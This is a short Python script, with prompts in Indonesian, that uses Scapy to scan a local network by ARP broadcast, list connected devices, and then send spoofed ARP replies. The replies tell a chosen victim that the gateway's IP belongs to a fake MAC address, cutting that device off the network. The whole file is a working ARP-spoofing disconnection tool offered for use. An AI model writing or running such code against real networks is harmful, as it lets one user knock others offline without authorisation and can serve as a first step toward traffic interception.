from scapy.layers.l2 import *
from scapy.all import *
from scapy.layers.dot11 import *
myip = get_if_addr(conf.iface)
my_macs = get_if_hwaddr(conf.iface)

def netcut(gateway):
    while True:
        victim_ip= input("\nMasukan IP Target: ")
        victim_mac = input("Masukan Mac Target: ")
        gateway_ip = gateway
        packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
        send(packet, verbose=0)
        ask = input("Ingin memutuskan jaringan lain ??? y/n ")
        if ask=="y":
            continue
        else:
         break

def identifikasi(target_ip):
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    # print clients
    print("Available devices in the network:")
    print("Your IP >> ", myip)
    print("Your Mac >> ", my_macs)
    print("Router IP >> ", ip, "\n")
    print("\nSemua yang terkoneksi dalam satu jaringan")
    print("IP" + " " * 18 + "MAC")
    # print(clients[0])
    a = clients[0]
    router_mac = a['mac']
    gateway_ip = a['ip']
    # print("Your Router/gateway IP >> ", gateway_ip)
    # print("Your Router/gateway Mac >> ", router_mac)
    for client in clients:
        print("{:16}    {}".format(client['ip'], client['mac']))
    netcut(gateway_ip)

if __name__=="__main__":
    ip = input("Masukan IP Router dan port nya , example xxx.xxx.x.x/yy , jika tidak maka akan default: ")
    if ip == "n":
        target_ip = "192.168.1.1/24"
    else:
        target_ip = ip
    print(target_ip)
    identifikasi(target_ip+"/24")


